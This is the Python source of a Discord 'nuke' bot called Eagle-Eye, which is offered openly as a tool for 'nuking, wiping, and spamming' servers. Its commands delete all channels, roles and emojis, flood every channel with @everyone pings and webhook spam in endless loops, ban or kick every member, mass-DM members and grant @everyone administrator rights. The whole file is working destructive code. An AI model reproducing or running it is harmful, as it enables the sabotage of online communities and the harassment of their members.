#Project by Pyro326
import discord
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
#from discord import AsyncWebhookAdapter
from discord import Webhook

client = commands.Bot(command_prefix="(",
                      intents=discord.Intents.all())
client.remove_command('help')
######################################setup########################################

token = "PLACEHOLDER"

channel_names = ['https://github.com/PyrosStuff']
message_spam = [
    '@everyone Thanks for using Eagle-Eye. This project was made by https://github.com/PyrosStuff .',
]
webhook_names = ['EglEye']


###################################################################################
@client.event
async def on_ready():
    await client.change_presence(
        activity=discord.Game(name="Eagle-Eye by https://github.com/PyrosStuff")
    )  #change this if you want
    print(f'''
  
 _________       _________
|  _______|     |  _______|
| |_______      | |_______
| |_______|     | |_______|
| |_______   _  | |_______   _
|_________| |_| |_________| |_|

Current middleman is {client.user}.
Type (help in Discord chat to get started.
Version 1.0

Eagle-Eye is maintained and coded by https://github.com/PyrosStuff

About: Eagle-Eye is a multipurpose Discord script meant to make nuking, wiping, and spamming easier for the 
inexperienced or people who just need a quick solution.
''')

@client.command()
async def wiper(ctx, amount=50):
    await ctx.message.delete()
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(
                f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
        except:
            pass
            print("\x1b[38;5;196mUnable To Delete Channel!")

@client.command()
async def nuke(ctx, amount=50):
    await ctx.message.delete()
    await ctx.guild.edit(name="This action was performed by the Eagle-Eye Discord solution")  #change this if u want
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(
                f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
        except:
            pass
            print("\x1b[38;5;196mUnable To Delete Channel!")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(channel_names))
            print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
        except:
            print("\x1b[38;5;196mUnable To Create Channel!")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(
                f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!"
            )

        except:
            print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
    await asyncio.sleep(2)
    for i in range(100):
        for i in range(1000):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(message_spam))
                    print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
                except:
                    print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
        for member in list(ctx.guild.members):
            try:
                await member.ban(reason="XR Nuke Bot")  #change this if u want
                print(
                    f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}"
                )
            except:
                print(
                    f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!"
                )


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(webhook_names))
    while True:
        await channel.send(random.choice(message_spam))
        await webhook.send(random.choice(message_spam),
                           username=random.choice(webhook_names))


@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != 1:
            for user in list(ctx.guild.members):
                try:
                    await ctx.guild.ban(user)
                    print(
                        f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}"
                    )
                except:
                    print(
                        f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!"
                    )


@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason="llllll")
            print(
                f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}"
            )
        except:
            print(
                f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!"
            )


@client.command()
async def rolespam(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_role(name=f"Eagle-Eyed")
            print(
                f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
        except:
            print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(
                f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!"
            )
        except:
            print(
                f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!"
            )


@client.command()
async def dm(ctx, *, message: str):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.send(message)
            print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
        except:
            print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        if role.name == '@everyone':
            try:
                await role.edit(permissions=Permissions.all())
                print(
                    f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!")
            except:
                print(
                    f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!"
                )


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str(
        """```fix\n(nuke - Destroys Guild\n\n(banall - Bans All Members \n\n(kickall - Kicks All Members\n\n(rolespam - Spams Roles\n\n(emojidel - Deletes All Emojis\n\n(admin - Gives Everyone Admin\n\nMore commands can be found by checking https://github.com/PyrosStuff```"""
    )
    embed = discord.Embed(color=14177041, title="Eagle-Eye")
    embed.add_field(name="Eagle-Eye Help Commands", value=retStr)
    embed.set_footer(
        text=f"Requested By {ctx.author} | Eagle-Eye is made by https://github.com/PyrosStuff")

    await ctx.send(embed=embed)


client.run(token)
